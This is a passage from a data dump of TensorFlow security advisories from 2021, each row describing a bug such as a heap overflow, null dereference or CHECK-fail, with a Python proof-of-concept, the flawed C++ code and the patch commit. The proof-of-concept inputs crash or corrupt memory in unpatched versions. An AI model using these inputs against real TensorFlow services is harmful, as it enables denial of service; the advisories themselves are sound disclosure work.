This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/e312e0791ce486a80c9d23110841525c6f7c3289/tensorflow/core/kernels/image/encode_png_op.cc#L57-L60) only validates that the total number of pixels in the image does not overflow. Thus, an attacker can send an empty matrix for encoding. However, if the tensor is empty, then the associated buffer is `nullptr`. Hence, when [calling `png::WriteImageToBuffer`](https://github.com/tensorflow/tensorflow/blob/e312e0791ce486a80c9d23110841525c6f7c3289/tensorflow/core/kernels/image/encode_png_op.cc#L79-L93), the first argument (i.e., `image.flat<T>().data()`) is `NULL`. This then triggers the `CHECK_NOTNULL` in the [first line of `png::WriteImageToBuffer`](https://github.com/tensorflow/tensorflow/blob/e312e0791ce486a80c9d23110841525c6f7c3289/tensorflow/core/lib/png/png_io.cc#L345-L349).

```cc
template <typename T>
bool WriteImageToBuffer(
    const void* image, int width, int height, int row_bytes, int num_channels,
    int channel_bits, int compression, T* png_string,
    const std::vector<std::pair<std::string, std::string> >* metadata) {
  CHECK_NOTNULL(image);
  ...
}
```

Since `image` is null, this results in `abort` being called after printing the stacktrace. Effectively, this allows an attacker to mount a denial of service attack.

### Patches
We have patched the issue in GitHub commit [26eb323554ffccd173e8a79a8c05c15b685ae4d1](https://github.com/tensorflow/tensorflow/commit/26eb323554ffccd173e8a79a8c05c15b685ae4d1).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
217,20741,tensorflow,GHSA-j47f-4232-hvv8,CVE-2021-29532,https://github.com/advisories/GHSA-j47f-4232-hvv8,low,2021-05-21 14:22:17 UTC,Heap out of bounds read in `RaggedCross`,"### Impact
An attacker can force accesses outside the bounds of heap allocated arrays by passing in invalid tensor values to `tf.raw_ops.RaggedCross`:

```python
import tensorflow as tf

ragged_values = []
ragged_row_splits = [] 
sparse_indices = []
sparse_values = []
sparse_shape = []

dense_inputs_elem = tf.constant([], shape=[92, 0], dtype=tf.int64)
dense_inputs = [dense_inputs_elem]

input_order = ""R""
hashed_output = False
num_buckets = 0
hash_key = 0 

tf.raw_ops.RaggedCross(ragged_values=ragged_values,
    ragged_row_splits=ragged_row_splits,
    sparse_indices=sparse_indices,
    sparse_values=sparse_values,
    sparse_shape=sparse_shape,
    dense_inputs=dense_inputs,
    input_order=input_order,
    hashed_output=hashed_output,
    num_buckets=num_buckets,
    hash_key=hash_key,
    out_values_type=tf.int64,
    out_row_splits_type=tf.int64)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/efea03b38fb8d3b81762237dc85e579cc5fc6e87/tensorflow/core/kernels/ragged_cross_op.cc#L456-L487) lacks validation for the user supplied arguments:

```cc
int next_ragged = 0;
int next_sparse = 0;
int next_dense = 0;
for (char c : input_order_) {
  if (c == 'R') {
    TF_RETURN_IF_ERROR(BuildRaggedFeatureReader(
        ragged_values_list[next_ragged], ragged_splits_list[next_ragged],
        features));
    next_ragged++;
  } else if (c == 'S') {
    TF_RETURN_IF_ERROR(BuildSparseFeatureReader(
        sparse_indices_list[next_sparse], sparse_values_list[next_sparse],
        batch_size, features));
    next_sparse++;
  } else if (c == 'D') {
    TF_RETURN_IF_ERROR(
        BuildDenseFeatureReader(dense_list[next_dense++], features));
  }
  ...
}
```

Each of the above branches call a helper function after accessing array elements via a `*_list[next_*]` pattern, followed by incrementing the `next_*` index. However, as there is no validation that the `next_*` values are in the valid range for the corresponding `*_list` arrays, this results in heap OOB reads.

### Patches
We have patched the issue in GitHub commit [44b7f486c0143f68b56c34e2d01e146ee445134a](https://github.com/tensorflow/tensorflow/commit/44b7f486c0143f68b56c34e2d01e146ee445134a).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
218,20741,tensorflow,GHSA-393f-2jr3-cp69,CVE-2021-29533,https://github.com/advisories/GHSA-393f-2jr3-cp69,low,2021-05-21 14:22:21 UTC,CHECK-fail in DrawBoundingBoxes,"### Impact
An attacker can trigger a denial of service via a `CHECK` failure by passing an empty image to `tf.raw_ops.DrawBoundingBoxes`:

```python
import tensorflow as tf

images = tf.fill([53, 0, 48, 1], 0.)
boxes = tf.fill([53, 31, 4], 0.)
boxes = tf.Variable(boxes)
boxes[0, 0, 0].assign(3.90621)
tf.raw_ops.DrawBoundingBoxes(images=images, boxes=boxes)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/ea34a18dc3f5c8d80a40ccca1404f343b5d55f91/tensorflow/core/kernels/image/draw_bounding_box_op.cc#L148-L165) uses `CHECK_*` assertions instead of `OP_REQUIRES` to validate user controlled inputs. Whereas `OP_REQUIRES` allows returning an error condition back to the user, the `CHECK_*` macros result in a crash if the condition is false, similar to `assert`.

```cc
const int64 max_box_row_clamp = std::min<int64>(max_box_row, height - 1);
... 
CHECK_GE(max_box_row_clamp, 0);
``` 
    
In this case, `height` is 0 from the `images` input. This results in `max_box_row_clamp` being negative and the assertion being falsified, followed by aborting program execution.
    
### Patches
We have patched the issue in GitHub commit [b432a38fe0e1b4b904a6c222cbce794c39703e87](https://github.com/tensorflow/tensorflow/commit/b432a38fe0e1b4b904a6c222cbce794c39703e87).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
219,20741,tensorflow,GHSA-6j9c-grc6-5m6g,CVE-2021-29534,https://github.com/advisories/GHSA-6j9c-grc6-5m6g,low,2021-05-21 14:22:24 UTC,CHECK-fail in SparseConcat,"### Impact
An attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.SparseConcat`: 

```python
import tensorflow as tf
import numpy as np

indices_1 = tf.constant([[514, 514], [514, 514]], dtype=tf.int64)
indices_2 = tf.constant([[514, 530], [599, 877]], dtype=tf.int64)
indices = [indices_1, indices_2]

values_1 = tf.zeros([0], dtype=tf.int64)
values_2 = tf.zeros([0], dtype=tf.int64)
values = [values_1, values_2]

shape_1 = tf.constant([442, 514, 514, 515, 606, 347, 943, 61, 2], dtype=tf.int64)
shape_2 = tf.zeros([9], dtype=tf.int64)
shapes = [shape_1, shape_2]

tf.raw_ops.SparseConcat(indices=indices, values=values, shapes=shapes, concat_dim=2)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/b432a38fe0e1b4b904a6c222cbce794c39703e87/tensorflow/core/kernels/sparse_concat_op.cc#L76) takes the values specified in `shapes[0]` as dimensions for the output shape:

```cc
TensorShape input_shape(shapes[0].vec<int64>());
```

The [`TensorShape` constructor](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status.

```cc
template <class Shape>
TensorShapeBase<Shape>::TensorShapeBase(gtl::ArraySlice<int64> dim_sizes) {
  set_tag(REP16);
  set_data_type(DT_INVALID);
  TF_CHECK_OK(InitDims(dim_sizes));
}
```

In our scenario, this occurs when adding a dimension from the argument results in overflow:

```cc
template <class Shape>
Status TensorShapeBase<Shape>::InitDims(gtl::ArraySlice<int64> dim_sizes) {
  ...
  Status status = Status::OK();
  for (int64 s : dim_sizes) {
    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));
    if (!status.ok()) {
      return status;
    }
  }
}

template <class Shape>
Status TensorShapeBase<Shape>::AddDimWithStatus(int64 size) {
  ...
  int64 new_num_elements;
  if (kIsPartial && (num_elements() < 0 || size < 0)) {
    new_num_elements = -1;
  } else {
    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);
    if (TF_PREDICT_FALSE(new_num_elements < 0)) {
        return errors::Internal(""Encountered overflow when multiplying "",
                                num_elements(), "" with "", size,
                                "", result: "", new_num_elements);
      }
  }
  ...
}
```

This is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.

### Patches
We have patched the issue in GitHub commit [69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c](https://github.com/tensorflow/tensorflow/commit/69c68ecbb24dff3fa0e46da0d16c821a2dd22d7c).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
220,20741,tensorflow,GHSA-m3f9-w3p3-p669,CVE-2021-29535,https://github.com/advisories/GHSA-m3f9-w3p3-p669,low,2021-05-21 14:22:28 UTC,Heap buffer overflow in `QuantizedMul`,"### Impact
An attacker can cause a heap buffer overflow in `QuantizedMul` by passing in invalid thresholds for the quantization:

```python
import tensorflow as tf

x = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)
y = tf.constant([256, 328], shape=[1, 2], dtype=tf.quint8)
min_x = tf.constant([], dtype=tf.float32)
max_x = tf.constant([], dtype=tf.float32)
min_y = tf.constant([], dtype=tf.float32)
max_y = tf.constant([], dtype=tf.float32)

tf.raw_ops.QuantizedMul(x=x, y=y, min_x=min_x, max_x=max_x, min_y=min_y, max_y=max_y)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/87cf4d3ea9949051e50ca3f071fc909538a51cd0/tensorflow/core/kernels/quantized_mul_op.cc#L287-L290) assumes that the 4 arguments are always valid scalars and tries to access the numeric value directly:

```cc 
const float min_x = context->input(2).flat<float>()(0);
const float max_x = context->input(3).flat<float>()(0);
const float min_y = context->input(4).flat<float>()(0);
const float max_y = context->input(5).flat<float>()(0);
```

However, if any of these tensors is empty, then `.flat<T>()` is an empty buffer and accessing the element at position 0 results in overflow.

### Patches
We have patched the issue in GitHub commit [efea03b38fb8d3b81762237dc85e579cc5fc6e87](https://github.com/tensorflow/tensorflow/commit/efea03b38fb8d3b81762237dc85e579cc5fc6e87).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
221,20741,tensorflow,GHSA-2gfx-95x2-5v3x,CVE-2021-29536,https://github.com/advisories/GHSA-2gfx-95x2-5v3x,low,2021-05-21 14:22:32 UTC,Heap buffer overflow in `QuantizedReshape`,"### Impact
An attacker can cause a heap buffer overflow in `QuantizedReshape` by passing in invalid thresholds for the quantization:

```python
import tensorflow as tf

tensor = tf.constant([], dtype=tf.qint32)
shape = tf.constant([], dtype=tf.int32)
input_min = tf.constant([], dtype=tf.float32)
input_max = tf.constant([], dtype=tf.float32)

tf.raw_ops.QuantizedReshape(tensor=tensor, shape=shape, input_min=input_min, input_max=input_max)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/a324ac84e573fba362a5e53d4e74d5de6729933e/tensorflow/core/kernels/quantized_reshape_op.cc#L38-L55) assumes that the 2 arguments are always valid scalars and tries to access the numeric value directly:

```cc
const auto& input_min_float_tensor = ctx->input(2);
...
const float input_min_float = input_min_float_tensor.flat<float>()(0);
const auto& input_max_float_tensor = ctx->input(3);
...
const float input_max_float = input_max_float_tensor.flat<float>()(0);
```

However, if any of these tensors is empty, then `.flat<T>()` is an empty buffer and accessing the element at position 0 results in overflow.

### Patches
We have patched the issue in GitHub commit [a324ac84e573fba362a5e53d4e74d5de6729933e](https://github.com/tensorflow/tensorflow/commit/a324ac84e573fba362a5e53d4e74d5de6729933e).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
222,20741,tensorflow,GHSA-8c89-2vwr-chcq,CVE-2021-29537,https://github.com/advisories/GHSA-8c89-2vwr-chcq,low,2021-05-21 14:22:35 UTC,Heap buffer overflow in `QuantizedResizeBilinear`,"### Impact
An attacker can cause a heap buffer overflow in `QuantizedResizeBilinear` by passing in invalid thresholds for the quantization:

```python
import tensorflow as tf

images = tf.constant([], shape=[0], dtype=tf.qint32)
size = tf.constant([], shape=[0], dtype=tf.int32) 
min = tf.constant([], dtype=tf.float32)
max = tf.constant([], dtype=tf.float32)

tf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max, align_corners=False, half_pixel_centers=False)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/50711818d2e61ccce012591eeb4fdf93a8496726/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L705-L706) assumes that the 2 arguments are always valid scalars and tries to access the numeric value directly:

```cc
const float in_min = context->input(2).flat<float>()(0);
const float in_max = context->input(3).flat<float>()(0);
```

However, if any of these tensors is empty, then `.flat<T>()` is an empty buffer and accessing the element at position 0 results in overflow.

### Patches 
We have patched the issue in GitHub commit [f6c40f0c6cbf00d46c7717a26419f2062f2f8694](https://github.com/tensorflow/tensorflow/commit/f6c40f0c6cbf00d46c7717a26419f2062f2f8694).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",pip
223,20741,tensorflow,GHSA-j8qc-5fqr-52fp,CVE-2021-29538,https://github.com/advisories/GHSA-j8qc-5fqr-52fp,low,2021-05-21 14:22:38 UTC,Division by zero in `Conv2DBackpropFilter`,"### Impact
An attacker can cause a division by zero to occur in `Conv2DBackpropFilter`:

```python
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)
filter_sizes = tf.constant([0, 0, 0, 0], shape=[4], dtype=tf.int32)
out_backprop = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32)

tf.raw_ops.Conv2DBackpropFilter(
  input=input_tensor,
  filter_sizes=filter_sizes,
  out_backprop=out_backprop,
  strides=[1, 1, 1, 1],
  use_cudnn_on_gpu=False,
  padding='SAME',
  explicit_paddings=[],
  data_format='NHWC',
  dilations=[1, 1, 1, 1]
)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da/tensorflow/core/kernels/conv_grad_filter_ops.cc#L513-L522) computes a divisor based on user provided data (i.e., the shape of the tensors given as arguments):

```cc
const size_t size_A = output_image_size * filter_total_size; 
const size_t size_B = output_image_size * dims.out_depth;
const size_t size_C = filter_total_size * dims.out_depth;
const size_t work_unit_size = size_A + size_B + size_C;
const size_t shard_size = (target_working_set_size + work_unit_size - 1) / work_unit_size;
```

If all shapes are empty then `work_unit_size` is 0. Since there is no check for this case before division, this results in a runtime exception, with potential to be abused for a denial of service. 

### Patches
We have patched the issue in GitHub commit [c570e2ecfc822941335ad48f6e10df4e21f11c96](https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
224,20741,tensorflow,GHSA-g4h2-gqm3-c9wq,CVE-2021-29539,https://github.com/advisories/GHSA-g4h2-gqm3-c9wq,low,2021-05-21 14:23:05 UTC,Segfault in tf.raw_ops.ImmutableConst,"### Impact
Calling [`tf.raw_ops.ImmutableConst`](https://www.tensorflow.org/api_docs/python/tf/raw_ops/ImmutableConst) with a `dtype` of `tf.resource` or `tf.variant` results in a segfault in the implementation as code assumes that the tensor contents are pure scalars.

```python
>>> import tensorflow as tf
>>> tf.raw_ops.ImmutableConst(dtype=tf.resource, shape=[], memory_region_name=""/tmp/test.txt"")
...
Segmentation fault
```

### Patches
We have patched the issue in 4f663d4b8f0bec1b48da6fa091a7d29609980fa4 and will release TensorFlow 2.5.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.

### Workarounds
If using `tf.raw_ops.ImmutableConst` in code, you can prevent the segfault by inserting a filter for the `dtype` argument.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",pip
225,20741,tensorflow,GHSA-xgc3-m89p-vr3x,CVE-2021-29540,https://github.com/advisories/GHSA-xgc3-m89p-vr3x,low,2021-05-21 14:23:09 UTC,Heap buffer overflow in `Conv2DBackpropFilter`,"### Impact
An attacker can cause a heap buffer overflow to occur in `Conv2DBackpropFilter`:

```python
import tensorflow as tf

input_tensor = tf.constant([386.078431372549, 386.07843139643234],
                           shape=[1, 1, 1, 2], dtype=tf.float32)
filter_sizes = tf.constant([1, 1, 1, 1], shape=[4], dtype=tf.int32)
out_backprop = tf.constant([386.078431372549], shape=[1, 1, 1, 1],
                           dtype=tf.float32)
  
tf.raw_ops.Conv2DBackpropFilter(
  input=input_tensor,
  filter_sizes=filter_sizes,
  out_backprop=out_backprop,
  strides=[1, 66, 49, 1],
  use_cudnn_on_gpu=True,
  padding='VALID',
  explicit_paddings=[],
  data_format='NHWC',
  dilations=[1, 1, 1, 1]
)
```

Alternatively, passing empty tensors also results in similar behavior: 

```python
import tensorflow as tf

input_tensor = tf.constant([], shape=[0, 1, 1, 5], dtype=tf.float32)
filter_sizes = tf.constant([3, 8, 1, 1], shape=[4], dtype=tf.int32)
out_backprop = tf.constant([], shape=[0, 1, 1, 1], dtype=tf.float32)

tf.raw_ops.Conv2DBackpropFilter(
  input=input_tensor,
  filter_sizes=filter_sizes, 
  out_backprop=out_backprop,
  strides=[1, 66, 49, 1], 
  use_cudnn_on_gpu=True,
  padding='VALID',
  explicit_paddings=[],
  data_format='NHWC',
  dilations=[1, 1, 1, 1]
)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1b0296c3b8dd9bd948f924aa8cd62f87dbb7c3da/tensorflow/core/kernels/conv_grad_filter_ops.cc#L495-L497) computes the size of the filter tensor but does not validate that it matches the number of elements in `filter_sizes`. Later, when reading/writing to this buffer, code uses the value computed here, instead of the number of elements in the tensor.

### Patches 
We have patched the issue in GitHub commit [c570e2ecfc822941335ad48f6e10df4e21f11c96](https://github.com/tensorflow/tensorflow/commit/c570e2ecfc822941335ad48f6e10df4e21f11c96).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
226,20741,tensorflow,GHSA-xqfj-35wv-m3cr,CVE-2021-29541,https://github.com/advisories/GHSA-xqfj-35wv-m3cr,low,2021-05-21 14:23:12 UTC,Null pointer dereference in `StringNGrams`,"### Impact
An attacker can trigger a dereference of a null pointer in `tf.raw_ops.StringNGrams`:

```python
import tensorflow as tf

data=tf.constant([''] * 11, shape=[11], dtype=tf.string)

splits = [0]*115
splits.append(3)
data_splits=tf.constant(splits, shape=[116], dtype=tf.int64)

tf.raw_ops.StringNGrams(data=data, data_splits=data_splits, separator=b'Ss',
                        ngram_widths=[7,6,11],
                        left_pad='ABCDE', right_pad=b'ZYXWVU',
                        pad_width=50, preserve_short_sequences=True)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L67-L74) does not fully validate the `data_splits` argument. This would result in [`ngrams_data`](https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L106-L110) to be a null pointer when the output would be computed to have 0 or negative size.

Later writes to the output tensor would then cause a null pointer dereference.

### Patches
We have patched the issue in GitHub commit [ba424dd8f16f7110eea526a8086f1a155f14f22b](https://github.com/tensorflow/tensorflow/commit/ba424dd8f16f7110eea526a8086f1a155f14f22b).
    
The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information 
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
  
### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
227,20741,tensorflow,GHSA-4hrh-9vmp-2jgg,CVE-2021-29542,https://github.com/advisories/GHSA-4hrh-9vmp-2jgg,low,2021-05-21 14:23:15 UTC,Heap buffer overflow in `StringNGrams`,"### Impact
An attacker can cause a heap buffer overflow by passing crafted inputs to `tf.raw_ops.StringNGrams`:

```python
import tensorflow as tf

separator = b'\x02\x00'    
ngram_widths = [7, 6, 11]
left_pad = b'\x7f\x7f\x7f\x7f\x7f'
right_pad = b'\x7f\x7f\x25\x5d\x53\x74'
pad_width = 50
preserve_short_sequences = True
  
l = ['', '', '', '', '', '', '', '', '', '', '']
  
data = tf.constant(l, shape=[11], dtype=tf.string)
  
l2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
     0, 0, 3]
data_splits = tf.constant(l2, shape=[116], dtype=tf.int64)

out = tf.raw_ops.StringNGrams(data=data,
    data_splits=data_splits, separator=separator,
    ngram_widths=ngram_widths, left_pad=left_pad,
    right_pad=right_pad, pad_width=pad_width,
    preserve_short_sequences=preserve_short_sequences)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1cdd4da14282210cc759e468d9781741ac7d01bf/tensorflow/core/kernels/string_ngrams_op.cc#L171-L185) fails to consider corner cases where input would be split in such a way that the generated tokens should only contain padding elements:
  
```cc
for (int ngram_index = 0; ngram_index < num_ngrams; ++ngram_index) {
  int pad_width = get_pad_width(ngram_width);
  int left_padding = std::max(0, pad_width - ngram_index);
  int right_padding = std::max(0, pad_width - (num_ngrams - (ngram_index + 1)));
  int num_tokens = ngram_width - (left_padding + right_padding);
  int data_start_index = left_padding > 0 ? 0 : ngram_index - pad_width;
  ...
  tstring* ngram = &output[ngram_index];
  ngram->reserve(ngram_size);
  for (int n = 0; n < left_padding; ++n) {
    ngram->append(left_pad_);
    ngram->append(separator_);
  }
  for (int n = 0; n < num_tokens - 1; ++n) {
    ngram->append(data[data_start_index + n]);
    ngram->append(separator_);
  }
  ngram->append(data[data_start_index + num_tokens - 1]); // <<<
  for (int n = 0; n < right_padding; ++n) {
    ngram->append(separator_);
    ngram->append(right_pad_);
  }
  ...
}
```

If input is such that `num_tokens` is 0, then, for `data_start_index=0` (when left padding is present), the marked line would result in reading `data[-1]`.

### Patches
We have patched the issue in GitHub commit [ba424dd8f16f7110eea526a8086f1a155f14f22b](https://github.com/tensorflow/tensorflow/commit/ba424dd8f16f7110eea526a8086f1a155f14f22b).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
228,20741,tensorflow,GHSA-fphq-gw9m-ghrv,CVE-2021-29543,https://github.com/advisories/GHSA-fphq-gw9m-ghrv,low,2021-05-21 14:23:18 UTC,CHECK-fail in `CTCGreedyDecoder`,"### Impact
An attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.CTCGreedyDecoder`:

```python
import tensorflow as tf

inputs = tf.constant([], shape=[18, 2, 0], dtype=tf.float32)
sequence_length = tf.constant([-100, 17], shape=[2], dtype=tf.int32)
merge_repeated = False

tf.raw_ops.CTCGreedyDecoder(inputs=inputs, sequence_length=sequence_length, merge_repeated=merge_repeated)
```
  
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/1615440b17b364b875eb06f43d087381f1460a65/tensorflow/core/kernels/ctc_decoder_ops.cc#L37-L50) has a `CHECK_LT` inserted to validate some invariants. When this condition is false, the program aborts, instead of returning a valid error to the user. This abnormal termination can be weaponized in denial of service attacks.

### Patches 
We have patched the issue in GitHub commit [ea3b43e98c32c97b35d52b4c66f9107452ca8fb2](https://github.com/tensorflow/tensorflow/commit/ea3b43e98c32c97b35d52b4c66f9107452ca8fb2).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.
                      
### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.        
                      
### Attribution
This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",pip
229,20741,tensorflow,GHSA-6g85-3hm8-83f9,CVE-2021-29544,https://github.com/advisories/GHSA-6g85-3hm8-83f9,low,2021-05-21 14:23:22 UTC,CHECK-fail in `QuantizeAndDequantizeV4Grad`,"### Impact
An attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.QuantizeAndDequantizeV4Grad`:

```python
import tensorflow as tf

gradient_tensor = tf.constant([0.0], shape=[1])
input_tensor = tf.constant([0.0], shape=[1])
input_min = tf.constant([[0.0]], shape=[1, 1])
input_max = tf.constant([[0.0]], shape=[1, 1])

tf.raw_ops.QuantizeAndDequantizeV4Grad(
  gradients=gradient_tensor, input=input_tensor,
  input_min=input_min, input_max=input_max, axis=0)
```                     
                        
This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/95078c145b5a7a43ee046144005f733092756ab5/tensorflow/core/kernels/quantize_and_dequantize_op.cc#L162-L163) does not validate the rank of the `input_*` tensors. In turn, this results in the tensors being passes as they are to [`QuantizeAndDequantizePerChannelGradientImpl`](https://github.com/tensorflow/tensorflow/blob/95078c145b5a7a43ee046144005f733092756ab5/tensorflow/core/kernels/quantize_and_dequantize_op.h#L295-L306):

```cc 
template <typename Device, typename T>
struct QuantizeAndDequantizePerChannelGradientImpl {
  static void Compute(const Device& d,
                      typename TTypes<T, 3>::ConstTensor gradient,
                      typename TTypes<T, 3>::ConstTensor input,
                      const Tensor* input_min_tensor,
                      const Tensor* input_max_tensor,
                      typename TTypes<T, 3>::Tensor input_backprop,
                      typename TTypes<T>::Flat input_min_backprop,
                      typename TTypes<T>::Flat input_max_backprop) {
    ...
    auto input_min = input_min_tensor->vec<T>();
    auto input_max = input_max_tensor->vec<T>();
    ...
}
```

However, the `vec<T>` method, requires the rank to 1 and triggers a `CHECK` failure otherwise.

### Patches
We have patched the issue in GitHub commit [20431e9044cf2ad3c0323c34888b192f3289af6b](https://github.com/tensorflow/tensorflow/commit/20431e9044cf2ad3c0323c34888b192f3289af6b).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2 as this is the only other affected version.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
